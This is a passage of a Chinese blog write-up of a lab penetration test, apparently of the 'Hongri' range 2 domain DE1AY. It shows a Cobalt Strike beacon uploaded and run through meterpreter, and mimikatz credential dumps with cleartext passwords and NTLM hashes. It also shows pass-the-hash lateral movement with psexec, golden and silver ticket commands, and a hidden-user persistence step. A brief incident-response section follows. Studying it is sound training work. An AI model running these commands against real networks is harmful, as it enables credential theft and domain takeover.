fe80::2050:47f4:eef7:78e2%13(Preferred) </span><br><span class="line">   IPv4 Address. . . . . . . . . . . : 10.10.10.80(Preferred) </span><br><span class="line">   Subnet Mask . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   Default Gateway . . . . . . . . . : 10.10.10.1</span><br><span class="line">   DHCPv6 IAID . . . . . . . . . . . : 301993001</span><br><span class="line">   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-25-06-97-6A-00-0C-29-68-D3-5F</span><br><span class="line">   DNS Servers . . . . . . . . . . . : 10.10.10.10</span><br><span class="line">   NetBIOS over Tcpip. . . . . . . . : Enabled</span><br><span class="line"></span><br><span class="line">C:\Oracle\Middleware\user_projects\domains\base_domain&gt;net config Workstation</span><br><span class="line">net config Workstation</span><br><span class="line">        Computer name                        \\WEB</span><br><span class="line">Full Computer name                   WEB.de1ay.com</span><br><span class="line">User name                            Administrator</span><br><span class="line"></span><br><span class="line">Workstation active on                </span><br><span class="line">        NetBT_Tcpip_&#123;D7E14072-49B9-45D3-BA8C-7955E6146CC2&#125; (000C29F386F9)</span><br><span class="line">        NetBT_Tcpip_&#123;AD80CD23-D97F-4814-A715-9248D845EA0F&#125; (000C29F38603)</span><br><span class="line"></span><br><span class="line">Software version                     Windows Server 2008 R2 Standard</span><br><span class="line"></span><br><span class="line">Workstation domain                   DE1AY</span><br><span class="line">Workstation Domain DNS Name          de1ay.com</span><br><span class="line">Logon domain                         DE1AY</span><br><span class="line"></span><br><span class="line">COM Open Timeout (sec)               0</span><br><span class="line">COM Send Count (byte)                32</span><br><span class="line">COM Send Timeout (msec)              250</span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure>

<p>尝试查询域信息的操作如：<code>net group &quot;domain admins&quot; /domain </code>，<code>net group &quot;domain controllers&quot; /domain </code>，<code>net group &quot;domain computers&quot; /domain</code><br>显示被禁止了，所以无法直接确定域控名称和ID。现在已知：</p>
<ol>
<li>域和域名：DE1AY，de1ay.com</li>
<li>DNS Server IP：10.10.10.10</li>
<li>域管极有可能为：de1ay&#x2F;Administrator</li>
</ol>
<p>使用<code>arp -a</code>探测一下网段：发现<code>10.10.10.10,10.10.10.201,192.168.44.201</code>三个有效IP。其中<code>10.10.10.10</code>可以ping通，剩余两个ping不通。</p>
<p>接下来，我会用 MSF 联动 CS 上传 CS马，使用CS Beacon来提取用户密码。</p>
<h1 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h1><h2 id="MSF联动CS"><a href="#MSF联动CS" class="headerlink" title="MSF联动CS"></a>MSF联动CS</h2><p>这里使用本地搭建CS并启动CS，其他不多讲。</p>
<p>启动CS后，创建Beacon HTTP监听器，生成相应的EXE后门，然后使用meterpreter上传至Web主机，并运行（Beacon TCP类型的后门没能成功上线，所以用了HTTP类型的）.这里省略了配置监听器和生成后门的过程。（还可以使用MSF进程注入的方法，注入到CS开启的监听器中）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload ~/CS4.3/backdoor/beacon.exe</span><br><span class="line">[*] Uploading  : /home/kali/CS4.3/backdoor/beacon.exe -&gt; beacon.exe</span><br><span class="line">[*] Uploaded 281.50 KiB of 281.50 KiB (100.0%): /home/kali/CS4.3/backdoor/beacon.exe -&gt; beacon.exe</span><br><span class="line">[*] Completed  : /home/kali/CS4.3/backdoor/beacon.exe -&gt; beacon.exe</span><br><span class="line">meterpreter &gt; shell </span><br><span class="line">Process 956 created.</span><br><span class="line">Channel 4 created.</span><br><span class="line">Microsoft Windows [�汾 6.1.7601]</span><br><span class="line">��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line">C:\Oracle\Middleware\user_projects\domains\base_domain&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">de1ay\administrator</span><br><span class="line"></span><br><span class="line">C:\Oracle\Middleware\user_projects\domains\base_domain&gt;beacon.exe</span><br><span class="line">beacon.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.staticaly.com/gh/Shienmy/picx-images-hosting@master/image.1twpbzlvw1sw.jpg"
                      alt="image"
                ></p>
<p>因为是通过管理员权限的shell运行的CS马，所以获取的Beacon也具有管理员权限。</p>
<h2 id="mimikatz获取密码和NTLM"><a href="#mimikatz获取密码和NTLM" class="headerlink" title="mimikatz获取密码和NTLM"></a>mimikatz获取密码和NTLM</h2><p>设置心跳时间，运行mimikatz获取账户密码和hash。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; sleep 3</span><br><span class="line">beacon&gt; logonpasswords</span><br></pre></td></tr></table></figure>
<p>logonpasswords导出的结果很多，这里总结一下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">* Username : mssql</span><br><span class="line">* SID      : S-1-5-21-2756371121-2868759905-3853650604-2103</span><br><span class="line">* Domain   : DE1AY</span><br><span class="line">* LM       : f67ce55ac831223dc187b8085fe1d9df</span><br><span class="line">* NTLM     : 161cff084477fe596a5db81874498a24</span><br><span class="line">* SHA1     : d669f3bccf14bf77d64667ec65aae32d2d10039d</span><br><span class="line">* Password : 1qaz@WSX</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">* Username : WEB$</span><br><span class="line">* SID      : S-1-5-20</span><br><span class="line">* Domain   : DE1AY</span><br><span class="line">* NTLM     : 11496f8fea15687da3a32abc23c18278</span><br><span class="line">* SHA1     : a3cae9357aaea18165d2ca51dfb5d19d4b43beb3</span><br><span class="line">* Password : 40 b1 ed b8 3d 92 1b a1 59 42 4a 8d fe 0a 12 1c 7f 43 50 10 70 61 02 1d 80 24 84 71 a4 4c b8 ed 2f c6 1f 78 89 42 44 dd e3 30 8e ca a2 84 00 9b 7a 1a 0d 02 4f b0 96 32 80 9a 9b ac 7d e6 e4 d8 af 8e b4 b2 21 f3 07 b6 76 10 86 d4 1a b8 6c b3 31 e9 a3 a9 4f d0 34 18 98 62 18 ae ed a9 2d 65 a9 3d 35 bb ba a6 da be 02 e8 ed 63 00 f2 36 15 16 64 0b b0 48 7c 43 d2 e0 db 35 61 b2 12 dd cb d6 a0 40 95 b1 1b ef 64 4f 85 30 77 7e 91 b9 7b 90 41 d1 20 36 c1 e9 33 b3 2c 41 f1 bc 3c 70 09 41 11 5b 81 10 53 20 ee 44 72 c0 9f 89 12 e8 bc 36 4d 08 0c 7a 06 34 44 c1 99 1b e8 31 e9 25 7a c5 12 fc 16 e0 16 ee 10 9c cc 01 2f 88 5b 05 55 22 6d 62 ca a5 8b 62 13 66 92 44 17 83 50 ee 9a f0 7d b0 c3 e8 f3 c9 bc 0f da 3d e5 d3 ec ef 94</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">* Username : Administrator</span><br><span class="line">* SID      : S-1-5-21-2756371121-2868759905-3853650604-500</span><br><span class="line">* Domain   : DE1AY</span><br><span class="line">* LM       : f67ce55ac831223dc187b8085fe1d9df</span><br><span class="line">* NTLM     : 161cff084477fe596a5db81874498a24</span><br><span class="line">* SHA1     : d669f3bccf14bf77d64667ec65aae32d2d10039d</span><br><span class="line">* Password : 1qaz@WSX</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">* Username : de1ay</span><br><span class="line">* SID      : S-1-5-21-2756371121-2868759905-3853650604-1001</span><br><span class="line">* Domain   : DE1AY</span><br><span class="line">* LM       : f67ce55ac831223dc187b8085fe1d9df</span><br><span class="line">* NTLM     : 161cff084477fe596a5db81874498a24</span><br><span class="line">* SHA1     : d669f3bccf14bf77d64667ec65aae32d2d10039d</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>如此一来就知道了各个账户NTLM和密码。</p>
<h2 id="ARP扫描内网主机"><a href="#ARP扫描内网主机" class="headerlink" title="ARP扫描内网主机"></a>ARP扫描内网主机</h2><p>使用CS Beacon进行ARP扫描：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; portscan 10.10.10.0-10.10.10.255 1-1024,3389,5000-6000 arp 1024</span><br><span class="line">[*] Tasked beacon to scan ports 1-1024,3389,5000-6000 on 10.10.10.0-10.10.10.255</span><br><span class="line">[+] host called home, sent: 93285 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">(ARP) Target &#x27;10.10.10.10&#x27; is alive. 00-0C-29-86-44-CC</span><br><span class="line"></span><br><span class="line">[+] received output:</span><br><span class="line">(ARP) Target &#x27;10.10.10.80&#x27; is alive. 00-0C-29-F3-86-03</span><br><span class="line"></span><br><span class="line">[+] received output:</span><br><span class="line">(ARP) Target &#x27;10.10.10.201&#x27; is alive. 00-0C-29-FB-20-DA</span><br><span class="line"></span><br><span class="line">[+] received output:</span><br><span class="line">10.10.10.201:3389</span><br><span class="line"></span><br><span class="line">[+] received output:</span><br><span class="line">10.10.10.201:139</span><br><span class="line">10.10.10.201:135</span><br><span class="line"></span><br><span class="line">[+] received output:</span><br><span class="line">10.10.10.80:3389</span><br><span class="line"></span><br><span class="line">[+] received output:</span><br><span class="line">10.10.10.80:139</span><br><span class="line">10.10.10.80:135</span><br><span class="line">10.10.10.80:80</span><br><span class="line">10.10.10.10:5985</span><br><span class="line"></span><br><span class="line">[+] received output:</span><br><span class="line">10.10.10.10:3389</span><br><span class="line"></span><br><span class="line">[+] received output:</span><br><span class="line">10.10.10.10:636</span><br><span class="line">10.10.10.10:593</span><br><span class="line"></span><br><span class="line">[+] received output:</span><br><span class="line">10.10.10.10:464</span><br><span class="line"></span><br><span class="line">[+] received output:</span><br><span class="line">10.10.10.10:389</span><br><span class="line"></span><br><span class="line">[+] received output:</span><br><span class="line">10.10.10.10:139</span><br><span class="line">10.10.10.10:135</span><br><span class="line"></span><br><span class="line">[+] received output:</span><br><span class="line">10.10.10.10:88</span><br><span class="line">10.10.10.10:53</span><br><span class="line"></span><br><span class="line">[+] received output:</span><br><span class="line">10.10.10.10:445 (platform: 500 version: 6.3 name: DC domain: DE1AY)</span><br><span class="line">10.10.10.80:445 (platform: 500 version: 6.1 name: WEB domain: DE1AY)</span><br><span class="line">10.10.10.201:445 (platform: 500 version: 6.1 name: PC domain: DE1AY)</span><br><span class="line">Scanner module is complete</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>通过ARP端口扫描发现除WEB外两台主机：DC和PC。</p>
<p>DC ip: 10.10.10.10，开启端口：53、88、135、139、389、464、593、636、445、3389、5985</p>
<p>PC ip: 10.10.10.201，开启端口：135、139、3389</p>
<h2 id="psexec-PTH横向"><a href="#psexec-PTH横向" class="headerlink" title="psexec PTH横向"></a>psexec PTH横向</h2><p>这里横向移动使用的工具为psexec，利用的方法是通过SMB服务445端口通过用户及密码或者NTLMhash或者密码hash进行登录，然后获取目标高权限控制台。</p>
<p>CS中提供了psexec，psexec64，psexec_psh三种方法。经过实验，psexec可以使用用户密码、用户NTLM哈希通过SMB Beacon进行横向，虽然psexec64显示upload file failed。</p>
<p>尝试使用HTTP Beacon，无法横向。</p>
<p>三种工具使用方法相同。</p>
<h3 id="psexec-PTH横向移动到DC"><a href="#psexec-PTH横向移动到DC" class="headerlink" title="psexec PTH横向移动到DC"></a>psexec PTH横向移动到DC</h3><p>在CS目标界面可以看见已经发现的主机：<img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.staticaly.com/gh/Shienmy/picx-images-hosting@master/image.2j6zr4ednoq.jpg"
                      alt="image"
                ></p>
<p>创建一个SMB监听器：<img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.staticaly.com/gh/Shienmy/picx-images-hosting@master/image.1sgbjtcu0zts.jpg"
                      alt="image"
                ></p>
<p>选择jump-&gt;psexec，选择SMB监听器，进行横向移动：<img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.staticaly.com/gh/Shienmy/picx-images-hosting@master/image.6m3b3d4wsco0.jpg"
                      alt="image"
                ></p>
<p>这里使用的是用户和NTLM哈希，jump-&gt;psexec操作在beacon中的命令为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; rev2self</span><br><span class="line">[*] Tasked beacon to revert token</span><br><span class="line">beacon&gt; pth DE1AY\Administrator 161cff084477fe596a5db81874498a24</span><br><span class="line">[*] Tasked beacon to run mimikatz&#x27;s sekurlsa::pth /user:Administrator /domain:DE1AY /ntlm:161cff084477fe596a5db81874498a24 /run:&quot;%COMSPEC% /c echo 44c1ac4cb80 &gt; \\.\pipe\b6f8d6&quot; command</span><br><span class="line">beacon&gt; jump psexec DC SMB</span><br></pre></td></tr></table></figure>
<p>如果使用密码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; rev2self</span><br><span class="line"></span><br><span class="line">beacon&gt; make_token DE1AY\Administrator 1qaz@WSX</span><br><span class="line"></span><br><span class="line">beacon&gt; jump psexec DC SMB</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>等待一段时间，10.10.10.10上线。</p>
<p>查看DC Beacon的权限：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell whoami</span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>

<h3 id="psexec-PTH横向移动至PC"><a href="#psexec-PTH横向移动至PC" class="headerlink" title="psexec PTH横向移动至PC"></a>psexec PTH横向移动至PC</h3><p>如法炮制前面移动至DC的方法。成功上线PC。<br><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.staticaly.com/gh/Shienmy/picx-images-hosting@master/image.2apkg810q1no.jpg"
                      alt="image"
                ><br><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.staticaly.com/gh/Shienmy/picx-images-hosting@master/image.6kbp7q3tob00.jpg"
                      alt="image"
                ></p>
<p>最后反复操作几次弄成下图这样（弄着玩）：<br><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.staticaly.com/gh/Shienmy/picx-images-hosting@master/image.1gacpfgvcdb4.jpg"
                      alt="image"
                ></p>
<h2 id="psexec-PTT横向之黄金票据"><a href="#psexec-PTT横向之黄金票据" class="headerlink" title="psexec PTT横向之黄金票据"></a>psexec PTT横向之黄金票据</h2><p>移动到DC后，制作黄金票据</p>
<h3 id="krbtgt-hash"><a href="#krbtgt-hash" class="headerlink" title="krbtgt hash"></a>krbtgt hash</h3><p>CS：<code>hashdump</code><br><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.staticaly.com/gh/Shienmy/picx-images-hosting@master/image.26ldo5htxqm8.jpg"
                      alt="image"
                ></p>
<h3 id="获取用户SID"><a href="#获取用户SID" class="headerlink" title="获取用户SID"></a>获取用户SID</h3><p>在DC的Beacon中使用<code>logonpasswords</code>没有找到Administrator的SID，只有域控DC$、de1ay、DWM$的信息，所以在WEB中再次运行Mimikatz获取用户信息，找到Administrator的SID。<br><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.staticaly.com/gh/Shienmy/picx-images-hosting@master/image.mvki3falsgw.jpg"
                      alt="image"
                ></p>
<h3 id="制作黄金票据"><a href="#制作黄金票据" class="headerlink" title="制作黄金票据"></a>制作黄金票据</h3><p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.staticaly.com/gh/Shienmy/picx-images-hosting@master/image.7dubntp3x6g0.jpg"
                      alt="image"
                ><br><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.staticaly.com/gh/Shienmy/picx-images-hosting@master/image.5liqur59o3k0.jpg"
                      alt="image"
                ><br><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.staticaly.com/gh/Shienmy/picx-images-hosting@master/image.6r565u0qks00.jpg"
                      alt="image"
                ></p>
<h3 id="使用黄金票据横向移动"><a href="#使用黄金票据横向移动" class="headerlink" title="使用黄金票据横向移动"></a>使用黄金票据横向移动</h3><p>仍然使用psexec和SMB通道进行横向，不过凭据不再是用户，密码或者NTLM hash，而是黄金票据，通过生成黄金票据的会话，可直接横向到其他主机：</p>
<p>DC的Beacon中，直接运行<code>jump psexec [target PC] [Listener]</code>，使用当前会话的凭据进行jump。<br><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.staticaly.com/gh/Shienmy/picx-images-hosting@master/image.4rais82c5l00.jpg"
                      alt="image"
                ><br><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.staticaly.com/gh/Shienmy/picx-images-hosting@master/image.1r2lh3ekz600.jpg"
                      alt="image"
                ></p>
<h2 id="psexec-PTT横向之白银票据"><a href="#psexec-PTT横向之白银票据" class="headerlink" title="psexec PTT横向之白银票据"></a>psexec PTT横向之白银票据</h2><p>白银票据不需要kbgtgt的ntlm哈希，可以绕过域控，而使用一个域用户，域SID，域用户NTLM哈希（rc4加密），一个服务。<br>根据前面生成黄金票据的方法即：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::golden /user:Administrator /domain:DE1AY.COM /sid:S-1-5-21-2756371121-2868759905-3853650604 /krbtgt:[krbtgt hash] /endin:480 /renewmax:10080 /ptt</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将其中user可以更改为任意一个用户，不再使用krbtgt的hash，而改为使用用户的LM值，即hashdump出来结果中，两条值中前面那条值。<br><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.staticaly.com/gh/Shienmy/picx-images-hosting@master/image.24gvforvb480.jpg"
                      alt="image"
                ></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::golden /user:de1ay /domain:DE1AY.COM /target:PC.DE1AY.COM /sid:S-1-5-21-2756371121-2868759905-3853650604 /rc4:161cff084477fe596a5db81874498a24 /services:cifs /endin:480 /renewmax:10080 /ptt</span><br></pre></td></tr></table></figure>
<p>这里有错误，先放一放。</p>
<h1 id="其他利用点"><a href="#其他利用点" class="headerlink" title="其他利用点"></a>其他利用点</h1><h2 id="SID-History-权限维持"><a href="#SID-History-权限维持" class="headerlink" title="SID History 权限维持"></a>SID History 权限维持</h2><p>这里我没有做成功。<br>SID History是一个域用户的属性，是为了保持原有权限的手段。这里我们可以复制高权限SID到低权限用户的SID History属性中，从而让低权限用户获得高权限，并且无法从SID中被发现，具备一定的隐蔽性。</p>
<ol>
<li><p>创建一个隐藏用户:<code>net user hack$ 123456.com /add</code></p>
</li>
<li><p>mimikatz 添加SID History：</p>
<p><code>privilege::debug</code></p>
<p><code>sid::patch</code></p>
<p><code>sid::add /sam:hack$ /new:Administrator</code></p>
</li>
</ol>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>利用MSF+CS进行后渗透很方便，CS集成了很多功能。</p>
<p>域渗透横向时用到的方法有：pth（用户ntlm hash）、ptt（黄金票据），使用的工具时psexec。</p>
<p>搭建隧道所用的方法是MSF上传CS HTTP马，利用HTTP beacon作为操作端，再利用445端口的SMB服务进行横向，搭建SMB通道。</p>
<p>除此之外还可以上传代理软件（如chisel），攻击机使用代理工具（如proxychains4）来建立代理socks5代理通道，运行攻击机本地的工具来进行内网渗透（比如代理nmap、msf meterpreter的流量）。</p>
<p>又比如可以使用EW、frp工具来建立隧道。</p>
<p>还有 ptk（用户AES256 key）、ptc（kerberos伪造证书）两种没有使用。</p>
<p>主要还是有点懒。暂时先到这。</p>
<h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><p>假设接到了Web RCE攻击告警，现在上机Web服务器来排查攻击情况。</p>
<ol>
<li>通过Process Hacker检查进程，服务，网络连接，在已建立的连接中，发现从本地端口到本地另一端口的网络连接，怀疑是端口转发，相应进程，打开对应文件位置，然后终止进程，备份文件，清除文件。然后继续检查网络连接，发现另一个稳定的远程连接，远程地址为192.168.44.128，对应程序为Powershell，选择终止该进程。随即又发现一个隔一段时间就重新建立连接的pwoershell进程，终止该进程。其中一个rundll32.exe进程没有对应服务，先观望。</li>
<li>发现网络连接远程地址中包含DC，上机DC进行排查，同样排查进程，网络连接，找到攻击者入侵手段，备份清楚后门。</li>
<li>最关键的是要防止攻击者时刻建立网络连接进行渗透，所以需要封IP，修补漏洞。</li>
</ol>

            </div>

            
                <div class="post-copyright-info">
                    
<div class="article-copyright-info-container">
    <ul class="copyright-info-content">
        <li class="post-title">
            <span class="type">本文标题</span>：<span class="content">红日靶场2-攻克记录</span>
        </li>
        <li class="post-author">
            <span class="type">本文作者</span>：<span class="content">seconme</span>
        </li>
        <li class="post-time">
            <span class="type">创建时间</span>：<span class="content">2023-05-19 13:02:42</span>
        </li>
        <li class="post-link">
            <span class="type">本文链接</span>：<span class="content">2023/05/19/红日靶场2-攻克记录/</span>
        </li>
        <li class="post-license">
            <span class="type">版权声明</span>：<span class="content">本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！</span>
        </li>
    </ul>
    <div class="copy-copyright-info flex-center tooltip" data-content="复制版权信息" data-offset-y="-2px">
        <i class="fa-solid fa-copy"></i>
    </div>
</div>

                </div>
            

            
                <ul class="post-tags-box">
                    
                        <li class="tag-item">
                            <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">#反序列化</a>&nbsp;
                        </li>
                    
                        <li class="tag-item">
                            <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">#内网渗透</a>&nbsp;
                        </li>
                    
                        <li class="tag-item">
                            <a href="/tags/Weblogic/">#Weblogic</a>&nbsp;
                        </li>
                    
                </ul>
            

            
                <div class="article-nav">
                    
                    
                        <div class="article-next">
                            <a class="next"
                               rel="next"
                               href="/2023/05/07/Vulnhub-Red/"
                            >
                            <span class="title flex-center">
                                <span class="post-nav-title-item">Vulnhub Red</span>
                                <span class="post-nav-item">下一篇</span>
                            </span>
                                <span class="right arrow-icon flex-center">
                              <i class="fas fa-chevron-right"></i>
                            </span>
                            </a>
                        </div>
                    
                </div>
            

            
                <div class="comment-container">
                    
<div class="comments-container">
    <div id="comments-anchor"></div>
    <div class="comment-area-title">
        <i class="fas fa-comments"></i>&nbsp;评论
    </div>
    
        
            

    <div class="gitalk-comment-container">
        <div id="gitalk-container"></div>
        <link rel="stylesheet" href="//unpkg.com/gitalk/dist/gitalk.css">
        <script  src="//unpkg.com/gitalk/dist/gitalk.min.js"></script>
        <script >
          function loadGitalk() {
            let __gitalk__pathname = decodeURI(location.pathname);
            const __gitalk__pathnameLength = __gitalk__pathname.length;
            const __gitalk__pathnameMaxLength = 50;
            if (__gitalk__pathnameLength > __gitalk__pathnameMaxLength) {
              __gitalk__pathname = __gitalk__pathname.substring(0, __gitalk__pathnameMaxLength - 3) + '...';
            }

            try {
              Gitalk && new Gitalk({
                clientID: '17efb64209824b16935b',
                clientSecret: '2ceab4677a6e6b5ebd72a6d3207a6611b13b7e95',
                repo: 'hexo-blog-comments',
                owner: 'seconme',
                admin: 'seconme',
                id: __gitalk__pathname,
                proxy: '',
                language: 'zh-CN'
              }).render('gitalk-container');
            } catch (e) {
              window.Gitalk = null;
            }
          }

          if ('false' === 'true') {
            const loadGitalkTimeout = setTimeout(() => {
              loadGitalk();
              clearTimeout(loadGitalkTimeout);
            }, 1000);
          } else {
            window.addEventListener('DOMContentLoaded', loadGitalk);
          }
        </script>
    </div>



        
    
</div>

                </div>
            
        </div>

        
            <div class="toc-content-container">
                <div class="post-toc-wrap">
    <div class="post-toc">
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%B6%E5%9C%BA%E5%87%86%E5%A4%87"><span class="nav-number">1.</span> <span class="nav-text">靶场准备</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">2.1.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="nav-number">2.2.</span> <span class="nav-text">Web目录扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Weblogic%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F"><span class="nav-number">2.3.</span> <span class="nav-text">Weblogic漏洞扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Weblogic%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E5%88%A9%E7%94%A8"><span class="nav-number">2.4.</span> <span class="nav-text">Weblogic漏洞验证利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9B%E4%B8%80%E6%AD%A5%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E5%9F%9F%EF%BC%89"><span class="nav-number">2.5.</span> <span class="nav-text">进一步信息收集（域）</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%9F%E6%B8%97%E9%80%8F"><span class="nav-number">3.</span> <span class="nav-text">域渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#MSF%E8%81%94%E5%8A%A8CS"><span class="nav-number">3.1.</span> <span class="nav-text">MSF联动CS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mimikatz%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81%E5%92%8CNTLM"><span class="nav-number">3.2.</span> <span class="nav-text">mimikatz获取密码和NTLM</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ARP%E6%89%AB%E6%8F%8F%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA"><span class="nav-number">3.3.</span> <span class="nav-text">ARP扫描内网主机</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#psexec-PTH%E6%A8%AA%E5%90%91"><span class="nav-number">3.4.</span> <span class="nav-text">psexec PTH横向</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#psexec-PTH%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%B0DC"><span class="nav-number">3.4.1.</span> <span class="nav-text">psexec PTH横向移动到DC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#psexec-PTH%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E8%87%B3PC"><span class="nav-number">3.4.2.</span> <span class="nav-text">psexec PTH横向移动至PC</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#psexec-PTT%E6%A8%AA%E5%90%91%E4%B9%8B%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="nav-number">3.5.</span> <span class="nav-text">psexec 